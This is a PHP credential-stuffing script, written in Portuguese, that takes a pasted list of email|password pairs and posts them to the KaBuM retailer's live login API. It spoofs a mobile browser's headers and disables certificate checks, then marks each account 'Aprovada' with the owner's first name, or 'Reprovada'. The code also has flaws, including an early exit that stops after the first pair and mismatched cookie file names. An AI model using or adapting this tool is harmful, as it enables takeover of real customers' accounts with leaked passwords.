<?php

extract($_GET);
error_reporting(0);

function getStr($string,$start,$end){
$str = explode($start,$string);
$str = explode($end,$str[1]);
return $str[0];}
{
$separador = "|";
$e = explode("\r\n", $lista);
$c = count($e);
for ($i=0; $i < $c; $i++) { 
$explode = explode($separador, $e[$i]);
Testar(trim($explode[0]),trim($explode[1]));}
}

function Testar($email,$senha){
if (file_exists(getcwd()."/cookies.txt")) {
unlink(getcwd()."/cookies.txt");}


$time = time();


//___________________________________//
// 1 LOGIN //
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicespub.prod.api.aws.grupokabum.com.br/login/v3/usuario/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
'accept: application/json, text/plain, */*',
'content-type: application/json;charset=UTF-8',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; TECTOY_5029Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'sec-fetch-site: cross-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: cors',
'referer: https://www.kabum.com.br/',

));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_USERAGENT, $_Server['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","senha":"'.$senha.'","session":"fc6f5120f2607867e8ca105f1e55ca63"}');
$data1 = curl_exec($ch);

$nome = GetStr($data1, 'cliente_pnome": "','",');


if (strpos($data1, 'id_cliente')) {
exit('<b><span class="badge badge-success">Aprovada</span> ➜ <font style=color: #000000>email = '.$email.' | senha = '.$senha.'</font> Nome: <font style=color:#000000>'.$nome.'</font></b><br>');}


else
exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-white">email ou senha inválidos</span></b><br>');}




?>